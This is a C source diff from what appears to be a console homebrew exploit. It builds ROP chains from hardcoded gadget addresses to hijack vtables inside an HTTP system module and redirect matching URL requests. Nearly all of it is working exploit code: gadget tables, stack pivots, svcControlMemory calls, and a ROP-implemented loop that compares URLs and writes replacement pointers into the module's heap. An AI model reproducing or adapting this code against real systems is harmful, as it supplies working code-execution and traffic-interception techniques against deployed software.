@@ -55,6 +55,7 @@ u32 ROP_CONDEQ_BXLR_VTABLECALL = 0x00119a24;//"beq <addr of bx-lr>" Otherwise, i
 u32 ROP_strncmp = 0x001064dc;
 u32 ROP_strncpy = 0x0010dc88;
 u32 ROP_memcpy = 0x0010d274;
+u32 ROP_strlen = 0x0010f848;
 u32 ROP_svcControlMemory = 0x00100770;
 u32 ROP_CreateContext = 0x0011689c;//This is the actual CreateContext function called via the *(obj+16) vtable. inr0=_this inr1=urlbuf* inr2=urlbufsize inr3=u8 requestmethod insp0=u32* out contexthandle
 u32 ROP_HTTPC_CMDHANDLER_CreateContext = 0x00114b4c;//This is the start of the code in the httpc_cmdhandler which handles the CreateContext cmd, starting with "ldr r7, =<cmdhdr>".
@@ -95,6 +96,7 @@ typedef enum {
 } targeturl_caps;//Bitmask of capabilities, 0 = none(vtable-ptr is left at the original one).
 
 typedef struct {
+	u32 next_vaddr;//Address of the next struct in the list in HTTP-sysmodule memory.
 	targeturl_caps caps;
 	u32 vtableptr;
 	u32 *vtable_sharedmemptr;
@@ -333,6 +335,21 @@ void ropgen_checkcond(u32 **ropchain, u32 *http_ropvaddr, u32 pivot_addr0, u32 p
 	ropgen_addword(ropchain, http_ropvaddr, 0);
 
 	if(type)ropgen_stackpivot(ropchain, http_ropvaddr, pivot_addr0);
+}
+
+inline void ropgen_checkcond_eqcontinue_nejump(u32 **ropchain, u32 *http_ropvaddr, u32 pivot_addr)
+{
+	ropgen_checkcond(ropchain, http_ropvaddr, 0, pivot_addr, 0);
+}
+
+inline void ropgen_checkcond_necontinue_eqjump(u32 **ropchain, u32 *http_ropvaddr, u32 pivot_addr)
+{
+	ropgen_checkcond(ropchain, http_ropvaddr, pivot_addr, 0, 1);
+}
+
+inline void ropgen_checkcond_eqjump_nejump(u32 **ropchain, u32 *http_ropvaddr, u32 jumpeq, u32 jumpne)
+{
+	ropgen_checkcond(ropchain, http_ropvaddr, jumpeq, jumpne, 1);
 }
 
 void ropgen_svcControlMemory(u32 **ropchain, u32 *http_ropvaddr, u32 outaddr, u32 addr0, u32 addr1, u32 size, MemOp op, MemPerm perm)//Total size: see ropgen_callfunc.
@@ -584,7 +601,7 @@ Result setuphaxx_httpheap_sharedmem()
 {
 	u32 pos, i;
 	u32 tmp_pos;
-	u32 tmpval;
+	u32 tmpaddr0;
 
 	u32 *ropchain = (u32*)ropvmem_sharedmem;
 	u32 ropvaddr = ropvmem_base;
@@ -592,6 +609,9 @@ Result setuphaxx_httpheap_sharedmem()
 	u32 *ropchain0, ropvaddr0;
 	u32 *ropchain1, ropvaddr1;
 	u32 *ropchain2, ropvaddr2;
+
+	u32 *ropchain_block0, ropvaddr_block0;
+	u32 *ropchain_block1, ropvaddr_block1;
 
 	u32 ropallocsize = 0x2000;
 	u32 ropoffset = 0x200;
@@ -627,6 +647,9 @@ Result setuphaxx_httpheap_sharedmem()
 
 	for(pos=0; pos<targeturl_list_entcount; pos++)
 	{
+		tmp_pos = targeturl_list_vaddr + ((pos+1)*sizeof(targeturlctx));
+		if(pos+1 < targeturl_list_entcount)targeturl_list[pos].next_vaddr = tmp_pos;
+
 		if(targeturl_list[pos].caps==0)continue;
 
 		targeturl_list[pos].vtableptr = memalloc_ropvmem_dataheap(&mainrop_endaddr, &targeturl_list[pos].vtable_sharedmemptr, ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
@@ -731,37 +754,91 @@ Result setuphaxx_httpheap_sharedmem()
 	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropheap+0x1c, 1);//*((u32*)(ropheap+0x1c)) = 0;
 	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropheap+0x20, 1);//*((u32*)(ropheap+0x20)) = 0;
 
-	for(pos=0; pos<targeturl_list_entcount; pos++)
+	ropgen_writeu32(&ropchain, &ropvaddr, targeturl_list_vaddr, ropheap+0x28, 1);
+
+	/*
+	The following ROP block does the following:
+	do {
+		if(strncmp(createcontext_inputurl, curent->url, strlen(curent->url))==0)
+		{
+			*((u32*)(ropheap+0x1c)) = curent->vtableptr;
+			if(*((u32*)curent->new_url))*((u32*)(ropheap+0x20)) = curent->new_url;
+			break;
+		}
+
+		curent = curent->next_vaddr;
+	} while(curent);
+	*/
+
 	{
-		tmpval = 0;
-		if(targeturl_list[pos].new_url[0])tmpval+= 0x30;
-
-		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x1c, 1);
-		ropgen_popr1(&ropchain, &ropvaddr, 0);
-		ropgen_checkcond(&ropchain, &ropvaddr, 0, ropvaddr + 0x40 + 0x74 + 0x8 + 0x40 + 0x30 + tmpval, 0);//if(<vtableptr value was set in a previous loop iteration>)<pivot to the end of this iteration block>
-
-		tmp_pos = targeturl_list_vaddr + pos*sizeof(targeturlctx);
+		tmpaddr0 = ropvaddr;
 
 		memset(params, 0, sizeof(params));
 		params[0] = ropheap+0x100;
-		params[1] = tmp_pos + offsetof(targeturlctx, url);
-		params[2] = strnlen(targeturl_list[pos].url, 0xff);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);
+		ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturlctx, url));
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x2c, 1);//Write the curent->url address to ropheap+0x2c.
+
+		ropgen_blxr3(&ropchain, &ropvaddr, ROP_strlen, 1);//Overwrite the r2 value which will be used for the below strncmp with strlen(curent->url).
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20*3 + 0x4, 1);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x2c, 1);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncmp with curent->url.
 
 		ropgen_callfunc(&ropchain, &ropvaddr, ROP_strncmp, params);
+
 		/*
-		if(strncmp(createcontext_inputurl, targeturl_list[pos].url, 0xff)==0)
+		if(strncmp(createcontext_inputurl, curent->url, strlen(curent->url))==0)
 		{
-			*((u32*)(ropheap+0x1c)) = targeturl_list[pos].vtableptr;
-			*((u32*)(ropheap+0x20)) = targeturl_list[pos].new_url;//Not generated when new_url is empty.
+			*((u32*)(ropheap+0x1c)) = curent->vtableptr;
+			if(*((u32*)curent->new_url))*((u32*)(ropheap+0x20)) = curent->new_url;
+			break;
 		}
 		*/
 
 		ropgen_popr1(&ropchain, &ropvaddr, 0);
-		ropgen_checkcond(&ropchain, &ropvaddr, 0, ropvaddr + 0x40 + 0x30 + tmpval, 0);
+		ropchain_block0 = ropchain;
+		ropvaddr_block0 = ropvaddr;
+		ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
 
-		ropgen_writeu32(&ropchain, &ropvaddr, targeturl_list[pos].vtableptr, ropheap+0x1c, 1);
-		if(tmpval)ropgen_writeu32(&ropchain, &ropvaddr, tmp_pos + offsetof(targeturlctx, new_url), ropheap+0x20, 1);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);//*((u32*)(ropheap+0x1c)) = curent->vtableptr;
+		ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturlctx, vtableptr));
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x1c, 1);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);//if(*((u32*)curent->new_url))
+		ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturlctx, new_url));
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);
+
+		ropgen_popr1(&ropchain, &ropvaddr, 0);
+		ropchain_block1 = ropchain;
+		ropvaddr_block1 = ropvaddr;
+		ropgen_checkcond_necontinue_eqjump(&ropchain, &ropvaddr, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);//*((u32*)(ropheap+0x20)) = curent->new_url;
+		ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturlctx, new_url));
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x20, 1);
+
+		ropgen_checkcond_necontinue_eqjump(&ropchain_block1, &ropvaddr_block1, ropvaddr);
+		ropchain_block1 = ropchain;//break;
+		ropvaddr_block1 = ropvaddr;
+		ropgen_stackpivot(&ropchain, &ropvaddr, 0);
+
+		ropgen_checkcond_eqcontinue_nejump(&ropchain_block0, &ropvaddr_block0, ropvaddr);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);//curent = curent->next_vaddr;
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);
+
+		ropgen_popr1(&ropchain, &ropvaddr, 0);//if(curent==NULL)break;
+		ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, tmpaddr0);
 	}
+
+	ropgen_stackpivot(&ropchain_block1, &ropvaddr_block1, ropvaddr);
 
 	//if(<new_url ptr initialized above is actually set>)<execute the following strncpy ROP>
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x20, 1);
